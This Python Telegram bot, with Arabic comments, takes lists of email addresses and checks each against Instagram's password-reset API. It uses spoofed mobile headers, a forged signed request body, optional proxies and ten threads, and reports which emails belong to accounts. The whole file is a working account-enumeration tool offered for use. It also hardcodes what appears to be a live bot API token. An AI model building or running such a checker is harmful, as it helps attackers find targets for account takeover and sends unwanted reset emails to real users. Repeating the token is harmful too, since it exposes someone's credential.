import telebot
import requests
import re
import os
import concurrent.futures
from user_agent import generate_user_agent

# --- إعدادات البوت ---
API_TOKEN = '8488920682:AAGhoJ-R5q5Xd4nVULrdmSxM2YfSch6j2RU'
bot = telebot.TeleBot(API_TOKEN)

# --- وظيفة الفحص (مقتبسة من mee.py) ---
def check_instagram_reset(email, proxy=None):
    try:
        ua = generate_user_agent()
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Host': 'i.instagram.com',
            'Connection': 'Keep-Alive',
            'User-Agent': ua,
            'Accept-Language': 'ar-EG, en-US',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': 'AQ==',
        }
        
        # الجسم المشفر للطلب (مستخرج من mee.py)
        data = {
            'ig_sig_key_version': '4',
            'signed_body': f'1cc3d514cd3f612bd1bee78bf8a81f13b49b95847879f7a6c53bf03ea542fbd3.{{"user_email":"{email}","device_id":"android-f3e94b5ecd948ea2","guid":"a26844c0-a663-4f2e-992b-7702ea61bc49","_csrftoken":"7gUfe6hxE57UPTM1VfyKBvVxzX6gWMQm"}}',
        }

        proxies_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
        
        response = requests.post(
            'https://i.instagram.com/api/v1/accounts/send_password_reset/',
            headers=headers,
            data=data,
            proxies=proxies_dict,
            timeout=10
        )
        
        if 'obfuscated_email' in response.text:
            return "HIT"  # مربوط بحساب
        return "FAIL" # غير مربوط
    except:
        return "ERROR"

# --- التعامل مع الرسائل والملفات ---
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "🚀 أهلاً بك في بوت فحص إيميلات إنستغرام.\nأرسل ملف .txt يحتوي على إيميلات أو أرسل الإيميلات مباشرة.")

@bot.message_handler(content_types=['document'])
def handle_docs(message):
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        emails = downloaded_file.decode('utf-8').splitlines()
        
        bot.send_message(message.chat.id, f"📥 تم استلام {len(emails)} إيميل. جاري الفحص...")
        
        hits = []
        # استخدام ThreadPoolExecutor للفحص السريع (كما في mee.py)
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = list(executor.map(check_instagram_reset, emails))
            
        for email, res in zip(emails, results):
            if res == "HIT":
                hits.append(email)
                bot.send_message(message.chat.id, f"✅ حساب مربوط: {email}")
        
        bot.send_message(message.chat.id, f"🏁 اكتمل الفحص.\nالعدد الإجمالي للحسابات المربوطة: {len(hits)}")
    else:
        bot.reply_to(message, "⚠️ يرجى إرسال ملف بصيغة .txt فقط.")

@bot.message_handler(func=lambda m: True)
def handle_text(message):
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', message.text)
    if emails:
        bot.send_message(message.chat.id, f"🔍 جاري فحص {len(emails)} إيميل...")
        for email in emails:
            res = check_instagram_reset(email)
            if res == "HIT":
                bot.send_message(message.chat.id, f"✅ مربوط: {email}")
            else:
                bot.send_message(message.chat.id, f"❌ غير مربوط: {email}")
    else:
        bot.reply_to(message, "❌ لم أجد إيميلات صالحة في رسالتك.")

bot.polling()
